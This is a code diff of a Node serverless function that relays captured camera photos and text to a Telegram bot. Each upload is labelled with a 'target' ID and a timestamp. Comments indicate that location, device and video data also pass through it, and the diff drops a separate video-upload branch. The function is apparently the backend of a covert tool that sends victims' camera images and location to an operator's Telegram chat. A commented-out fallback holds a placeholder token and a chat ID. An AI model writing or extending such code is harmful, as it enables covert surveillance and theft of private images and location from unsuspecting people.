@@ -1,11 +1,18 @@
-// api/send.js
+// api/send.js — وسيط التطبيق (Vercel Serverless, Node 18+)
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).json({ ok: false, error: 'POST only' });
     }
 
+    // ====== التوكن والمعرف من إعدادات مشروعك على Vercel ======
+    // (لن تظهر أبداً في الملفات المنشورة ولا في الروابط)
     const TOKEN = process.env.TELEGRAM_TOKEN || '';
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+
+    // ⚠️ بديل مؤقت فقط (ضع القيم ثم احذف الأسطر الخاصة بالمتغيرات):
+    // const TOKEN = '123456789:AAFxxxxxxxx';
+    // const CHAT_ID = '1015102519';
+    // =========================================================
 
     if (!TOKEN || !CHAT_ID) {
         return res.status(500).json({ ok: false, error: 'مفاتيح الخادم غير مضبوطة بعد' });
@@ -24,7 +31,7 @@ export default async function handler(req, res) {
     const tg = `https://api.telegram.org/bot${TOKEN}`;
 
     try {
-        // ====== وێنە (photo) ======
+        // ====== وێنەیی (كاميرا) ======
         if (body.type === 'photo') {
             const dataUrl = String(body.photo || '');
             const base64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
@@ -34,7 +41,8 @@ export default async function handler(req, res) {
             }
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
-            form.append('caption', `${body.caption || '📸 صورة'}\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);
+            form.append('caption',
+                `${body.caption || '📸 صورة'}\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);
             form.append('photo', new Blob([buf], { type: 'image/jpeg' }), `cap_${chatId}.jpg`);
 
             const r = await fetch(`${tg}/sendPhoto`, { method: 'POST', body: form });
@@ -42,25 +50,7 @@ export default async function handler(req, res) {
             return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
         }
 
-        // ====== ڤیدیۆ (video) – تازە ======
-        if (body.type === 'video') {
-            const dataUrl = String(body.video || '');
-            const base64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
-            const buf = Buffer.from(base64, 'base64');
-            if (!buf.length || buf.length > 50 * 1024 * 1024) {  // تا 50 مێگابایت
-                return res.status(400).json({ ok: false, error: 'فيديو غير صالح' });
-            }
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('caption', `${body.caption || '🎥 فيديو'}\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);
-            form.append('video', new Blob([buf], { type: 'video/webm' }), `vid_${chatId}.webm`);
-
-            const r = await fetch(`${tg}/sendVideo`, { method: 'POST', body: form });
-            const j = await r.json().catch(() => ({}));
-            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
-        }
-
-        // ====== دەق ======
+        // ====== نص (موقع/جهاز/صامت/فيديو) ======
         const text = String(body.text || '').slice(0, 4000);
         if (!text) return res.status(400).json({ ok: false, error: 'نص فارغ' });
 
